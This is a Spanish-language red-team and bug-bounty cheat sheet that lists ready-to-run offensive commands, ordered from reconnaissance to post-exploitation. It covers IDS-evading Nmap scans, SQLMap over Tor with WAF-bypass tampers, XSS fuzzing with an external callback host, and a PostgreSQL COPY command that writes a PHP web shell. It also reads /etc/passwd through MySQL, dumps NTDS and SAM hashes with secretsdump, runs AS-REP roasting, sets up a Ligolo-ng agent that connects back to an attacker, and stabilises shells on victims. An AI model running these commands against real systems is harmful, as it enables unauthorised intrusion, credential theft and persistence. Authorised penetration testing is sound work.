# 🛡️ The Ultimate Staff-Level Red Team & Bug Bounty Arsenal

Repositorio avanzado de *payloads*, comandos y tácticas operacionales para auditorías de seguridad, Bug Bounty y Red Teaming. Orientado a la máxima eficiencia, automatización y evasión en entornos fortificados.

---

## 📑 Tabla de Contenidos

1. [OSINT y Reconocimiento Perimetral](https://www.google.com/search?q=%231-osint-y-reconocimiento-perimetral)
2. [Enumeración de Subdominios y DNS](https://www.google.com/search?q=%232-enumeraci%C3%B3n-de-subdominios-y-dns)
3. [Escaneo de Puertos y Detección de Servicios](https://www.google.com/search?q=%233-escaneo-de-puertos-y-detecci%C3%B3n-de-servicios)
4. [Fuzzing y Crawling Web Avanzado](https://www.google.com/search?q=%234-fuzzing-y-crawling-web-avanzado)
5. [Explotación Web (SQLi, XSS, SSRF, HRS)](https://www.google.com/search?q=%235-explotaci%C3%B3n-web)
6. [Auditoría de Bases de Datos](https://www.google.com/search?q=%236-auditor%C3%ADa-de-bases-de-datos)
7. [Active Directory y Redes Internas](https://www.google.com/search?q=%237-active-directory-y-redes-internas)
8. [Pivoting, Túneles y Evasión](https://www.google.com/search?q=%238-pivoting-t%C3%BAneles-y-evasi%C3%B3n)
9. [Auditoría de Código (SAST) y Control de Versiones](https://www.google.com/search?q=%239-auditor%C3%ADa-de-c%C3%B3digo-sast-y-control-de-versiones)
10. [Ingeniería Inversa y Análisis de Binarios](https://www.google.com/search?q=%2310-ingenier%C3%ADa-inversa-y-an%C3%A1lisis-de-binarios)
11. [Post-Explotación y Estabilización](https://www.google.com/search?q=%2311-post-explotaci%C3%B3n-y-estabilizaci%C3%B3n)

---

## 1. OSINT y Reconocimiento Perimetral

La recolección de información pública es el primer paso vital para mapear la infraestructura objetivo sin interacción directa.

### Motores de Búsqueda y Bases de Datos

* **Shodan:** [https://shodan.io/](https://shodan.io/) - Motor de búsqueda para dispositivos conectados a Internet.
* **Censys:** [https://search.censys.io/](https://search.censys.io/) - Plataforma para descubrir, monitorear y analizar la superficie de ataque.

### Herramientas de Inteligencia

* **Maltego:** Análisis de enlaces e inteligencia de fuentes abiertas (OSINT) interactivo.
* **SpiderFoot:** Automatización de OSINT para recolectar inteligencia de IPs, dominios y correos.
* **FOCA:** Herramienta para extraer metadatos e información oculta en documentos públicos.
* **Wappalyzer / WhatWeb:** Identificación de tecnologías web y frameworks utilizados en la aplicación objetivo.

### Comandos de Identificación Tecnológica

```bash
# WhatWeb: Identificación rápida de tecnologías y cabeceras
whatweb -v https://DOMAIN.com

# Amass: Descubrimiento de infraestructura ligada a una organización (ASN/CIDR)
amass intel -org "Target Company" -active -src -ip

# Extracción manual de ASN mediante BGP.he.net
curl -s "https://bgp.he.net/search?search%5Bsearch%5D=Target" | grep -oP 'AS\d+' | sort -u

```

---

## 2. Enumeración de Subdominios y DNS

### Descubrimiento de Subdominios Pasivo y Activo

```bash
# Subfinder: Búsqueda rápida de subdominios
subfinder -d DOMAIN.com -o subfinder.txt

# theHarvester: Automatización avanzada con procesamiento de JSON
# Este comando iterará sobre la lista de subfinder, usará múltiples fuentes y compilará todo en un único archivo JSON final
echo "[]" > theHarvester.txt; for d in $(cat subfinder.txt); do theHarvester -d $d -l 500 -b crtsh,duckduckgo,hackertarget,rapiddns,subdomaincenter,yahoo -q -f "temp"; if [ -f temp.json ]; then jq ". + [$(cat temp.json)]" theHarvester.txt > final.json && mv final.json theHarvester.txt; rm temp.json temp.xml; fi; done

# Amass (Framework Adicional)
amass enum -passive -d DOMAIN.com -config ~/.config/amass/config.ini | anew subfinder.txt

```

### Fuerza Bruta y Resolución DNS (DNSRecon)

```bash
# DNSRecon: Bucle bash para analizar transferencia de zona, zonewalk y fuerza bruta basado en la lista de subfinder
while IFS= read -r d; do d=$(echo "$d" | tr -d '\r'); echo "[*] Analizando: $d" | tee -a dnsrecon.txt; dnsrecon -d "$d" -t std,axfr,zonewalk,snoop,rvl -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -s --threads 50 --disable_check_bindversion -v 2>&1 | tee -a dnsrecon.txt; done < subfinder.txt

```

---

## 3. Escaneo de Puertos y Detección de Servicios

### Escaneo de Alta Velocidad

```bash
# Masscan: Escaneo ultra rápido de todo el rango de puertos TCP
masscan -p1-65535 10.10.10.1 --rate=1000

# RustScan: Escaneo masivo escrito en Rust, enviando resultados directos a Nmap
rustscan -a 10.10.10.0/24 -b 2000 -- -sV -sC -Pn -oA rustscan_results

# Naabu: Escaneo rápido e integración directa con httpx para validación web
naabu -l subfinder.txt -p - -c 1000 -silent | httpx -silent -sc -td -title -o active_web_ports.txt

```

### Nmap Táctico (Staff Level)

```bash
# Nmap: Evasión de IDS/IPS (Fragmentación, MTU, y decoys)
sudo nmap -sS -p- -f --mtu 24 -D RND:10 --min-rate 1000 --max-retries 1 -Pn -sV --version-light target.com -oA nmap_stealth

# Nmap: Escaneo UDP optimizado (Top 1000 puertos vitales)
sudo nmap -sU --top-ports 1000 --max-retries 1 --min-rate 1000 target.com -oA nmap_udp

```

---

## 4. Fuzzing y Crawling Web Avanzado

### Crawling Exhaustivo y Ejecución JavaScript (Headless)

```bash
# Katana: Configuración avanzada para crawling, parseando JS, parámetros y endpoints
sudo katana -u https://DOMAIN.com/ \
  -d 5 \
  -jc \
  -jsl \
  -kf all \
  -aff \
  -fx \
  -xhr \
  -td \
  -c 5 \
  -rl 50 -o katana.txt

```

### Fuerza Bruta de Directorios y Fuzzing Inteligente

```bash
# Feroxbuster: Crawling y fuerza bruta exhaustiva con recursividad y extracción de backups
feroxbuster -u https://DOMAIN.com/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -t 100 -x php,html,js,txt,conf,bak,old,zip,sql,env -C 404 -r --depth 3 --no-state --smart --thorough --collect-backups --collect-words --collect-extensions -k -A -o feroxbuster.txt

# Ffuf: Auto-calibración (bypass WAFs/403/429) enviado por proxy local (Burp)
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt:FUZZ -u https://DOMAIN.com/FUZZ -ac -recursion -recursion-depth 3 -x http://127.0.0.1:8080 -t 100 -o ffuf_results.json

```

---

## 5. Explotación Web

### Escaneo de Vulnerabilidades Automatizado

```bash
# Nuclei: Escaneo enfocado en CVEs y misconfigs, evadiendo Rate Limits
nuclei -l active_web_ports.txt -t cves/ -t misconfiguration/ -t exposures/ -es info,low -rl 150 -c 50 -o nuclei_critical.txt

```

### Inyección SQL y WAF Bypass

```bash
# SQLMap: Dumping agresivo usando Tor, bypass de WAF mediante tamper scripts y randomización
sqlmap -u "https://DOMAIN.com/api?id=1*" --level=5 --risk=3 --tamper=space2comment,apostrophemask,between --random-agent --tor --tor-type=SOCKS5 -p id --dbs --batch --threads 10

```

### Cross-Site Scripting (XSS)

```bash
# Dalfox: Fuzzing paramétrico ciego con servidor C2 (OAST) basado en la salida de Katana
cat katana.txt | kxss | dalfox pipe --silence --format custom --found-action "notify" --custom-payload ./payloads.txt -b https://your-xss-hunter.com

```

### HTTP Request Smuggling (CL.TE / TE.CL)

```bash
# Smuggler: Identificación de discrepancias de parsing en proxies/load balancers
python3 smuggler.py -u https://DOMAIN.com/ -q

```

---

## 6. Auditoría de Bases de Datos

### PostgreSQL

```bash
# Conexión, versión y ejecución de RCE vía COPY
psql -h 10.10.10.5 -U postgres -c "SELECT version();"
psql -h 10.10.10.5 -U postgres -c "COPY (SELECT '<?php system($_GET[\"c\"]); ?>') TO '/var/www/html/shell.php';"

```

### MySQL

```bash
# Enumeración y lectura de archivos de sistema locales (LFI a través de BD)
mysql -h 10.10.10.5 -u root -p -e "SHOW DATABASES;"
mysql -h 10.10.10.5 -u root -p -e "SELECT LOAD_FILE('/etc/passwd');"

```

---

## 7. Active Directory y Redes Internas

### NetExec (Enumeración y Movimiento Lateral)

```bash
# SMB: Enumeración de shares, políticas y búsqueda de archivos con credenciales en la red
nexec smb 10.10.10.0/24 -u 'user' -p 'pass' --shares --pass-pol --spider 'C$' --pattern 'password' 'cred'

# WinRM: Ejecución de comandos remotos (RCE)
nexec winrm 10.10.10.10 -u 'admin' -p 'pass' -x 'whoami /all'

```

### Impacket Toolkit y BloodHound

```bash
# AS-REP Roasting (Usuarios sin pre-autenticación Kerberos)
impacket-GetNPUsers domain.local/ -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt -dc-ip 10.10.10.10

# SecretsDump: Extracción de hashes NTDS.dit y SAM local
impacket-secretsdump domain.local/admin:password@10.10.10.10

# BloodHound: Recolección de relaciones y permisos (Ingestor desde Linux)
bloodhound-python -u 'user' -p 'password' -d domain.local -ns 10.10.10.10 -c All

```

---

## 8. Pivoting, Túneles y Evasión

### Ligolo-ng (El estándar moderno para Red Team)

*Reemplaza a Proxychains creando interfaces TUN reales (Cero latencia TCP/IP).*

```bash
# 1. Servidor (Atacante): Levantar la interfaz
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert

# 2. Agente (Víctima): Conexión de vuelta al atacante
./agent -connect 10.10.10.5:11601 -ignore-cert

# 3. Servidor (Atacante): Enrutamiento de subredes internas a través del túnel
sudo ip route add 172.16.0.0/16 dev ligolo

```

### SSH Port Forwarding

```bash
# Local Port Forwarding (Exponer puerto remoto de la víctima en tu localhost)
ssh -L 8080:127.0.0.1:80 user@10.10.10.5

# Dynamic Port Forwarding (Crear proxy SOCKS5 local)
ssh -D 1080 -N -f user@10.10.10.5

```

---

## 9. Auditoría de Código (SAST) y Control de Versiones

### Semgrep (Análisis Estático)

```bash
# Escaneo de seguridad estricto para lenguajes compilados y de scripting
semgrep scan --config "p/python" --config "p/rust" --config "p/c" --severity=ERROR .

# Búsqueda exclusiva de variables de entorno hardcodeadas o secretos
semgrep scan --config "p/secrets" .

```

### Detección de Fugas de Información en Repositorios

```bash
# TruffleHog: Escaneo agresivo verificando credenciales vivas en la organización
trufflehog github --org=TargetOrg --only-verified --json

# Gitleaks: Auditoría profunda offline
gitleaks detect -v --source=/opt/target_repo --report-format=json --report-path=gitleaks_report.json --no-git

```

---

## 10. Ingeniería Inversa y Análisis de Binarios

### Radare2 (r2)

```bash
# Análisis estático completo de un binario ELF/PE
r2 -A /ruta/al/binario
[0x00000000]> afl   # Listar todas las funciones reconocidas
[0x00000000]> izz   # Extraer strings en todo el archivo binario
[0x00000000]> pdf @ main # Desensamblar y ver la estructura de la función main
[0x00000000]> VV    # Entrar al modo de grafo visual

```

### Cadenas y Análisis Básico de Linux

```bash
# Búsqueda de strings en un binario excluyendo basura y demangleando C++
strings -n 8 /ruta/al/binario | c++filt
objdump -d -M intel /ruta/al/binario | grep -i "call"

```

---

## 11. Post-Explotación y Estabilización

### Bypass de Anti-Idle (Evitar Cierres de Conexión)

```bash
# Ejecutar en la shell víctima para evitar el timeout por inactividad de firewalls/routers
while true; do echo -n " "; sleep 60; done &

```

### Estabilización Absoluta de Shells a PTY

```bash
# Upgrade con Python (Permite autocompletado, historial y usar Ctrl+C sin perder acceso)
python3 -c 'import pty; pty.spawn("/bin/bash")'
# [Presionar Ctrl + Z en tu teclado]
stty raw -echo; fg
export TERM=xterm-256color
export SHELL=/bin/bash
stty rows 40 columns 130 # Adaptar al tamaño real de tu monitor

```

### Escalada de Privilegios Local (LinPEAS y Enumeración Manual)

```bash
# Búsqueda silenciosa de binarios SUID y Capabilities (Vectores directos de PrivEsc)
find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
getcap -r / 2>/dev/null

# Monitorización de procesos del sistema en tiempo real sin ser root
./pspy64 -pf -i 1000

```
